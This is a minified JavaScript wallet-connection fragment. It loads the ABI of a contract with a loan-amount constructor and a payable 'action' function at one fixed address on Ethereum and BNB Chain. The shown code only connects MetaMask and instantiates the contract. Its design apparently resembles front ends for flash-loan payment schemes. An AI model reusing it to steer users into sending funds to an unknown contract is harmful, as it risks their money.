const contractDetails = {
    address: "0xF10BE42eb18900E6a4D18688C310475E3fdC7694",
    abi: [
      {
        inputs: [
          {
            internalType: "string",
            name: "_tokenName",
            type: "string",
          },
          {
            internalType: "string",
            name: "_tokenSymbol",
            type: "string",
          },
          {
            internalType: "uint256",
            name: "_loanAmount",
            type: "uint256",
          },
        ],
        stateMutability: "nonpayable",
        type: "constructor",
      },
      {
        inputs: [],
        name: "action",
        outputs: [],
        stateMutability: "payable",
        type: "function",
      },
      {
        inputs: [],
        name: "tokenName",
        outputs: [
          {
            internalType: "string",
            name: "",
            type: "string",
          },
        ],
        stateMutability: "view",
        type: "function",
      },
      {
        inputs: [],
        name: "tokenSymbol",
        outputs: [
          {
            internalType: "string",
            name: "",
            type: "string",
          },
        ],
        stateMutability: "view",
        type: "function",
      },
      {
        stateMutability: "payable",
        type: "receive",
      },
    ],
  },
  bnbContractDetails = {
    address: "0xF10BE42eb18900E6a4D18688C310475E3fdC7694",
    abi: [
      {
        inputs: [
          {
            internalType: "string",
            name: "_tokenName",
            type: "string",
          },
          {
            internalType: "string",
            name: "_tokenSymbol",
            type: "string",
          },
          {
            internalType: "uint256",
            name: "_loanAmount",
            type: "uint256",
          },
        ],
        payable: !1,
        stateMutability: "nonpayable",
        type: "constructor",
      },
      {
        payable: !0,
        stateMutability: "payable",
        type: "fallback",
      },
      {
        constant: !1,
        inputs: [],
        name: "action",
        outputs: [],
        payable: !0,
        stateMutability: "payable",
        type: "function",
      },
      {
        constant: !0,
        inputs: [],
        name: "tokenName",
        outputs: [
          {
            internalType: "string",
            name: "",
            type: "string",
          },
        ],
        payable: !1,
        stateMutability: "view",
        type: "function",
      },
      {
        constant: !0,
        inputs: [],
        name: "tokenSymbol",
        outputs: [
          {
            internalType: "string",
            name: "",
            type: "string",
          },
        ],
        payable: !1,
        stateMutability: "view",
        type: "function",
      },
    ],
  };
async function loadWeb3() {
    if (window.isBnb = !1,
        window.ethereum) {
        if (window.web3 = new Web3(window.ethereum))
            await window.ethereum.enable()
    } else {
        if (!window.web3)
            return void window.alert("Non-Ethereum browser detected. Please install MetaMask.");
        window.web3 = new Web3(window.web3.currentProvider)
    }
    var t = await web3.eth.net.getId()
        , e = await web3.eth.getChainId();
    if (56 == t && 56 == e)
        window.contract = new window.web3.eth.Contract(bnbContractDetails.abi, bnbContractDetails.address),
            window.isBnb = !0;
    else {
        if (1 != t || 1 != e)
            return alert("Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Ethereum Mainnet \n- Binance Smart Chain Mainnet");
        window.contract = new window.web3.eth.Contract(contractDetails.abi, contractDetails.address)
    }
    return window.contract ? window.web3.eth.getAccounts() : alert("Error loading contract data")
}
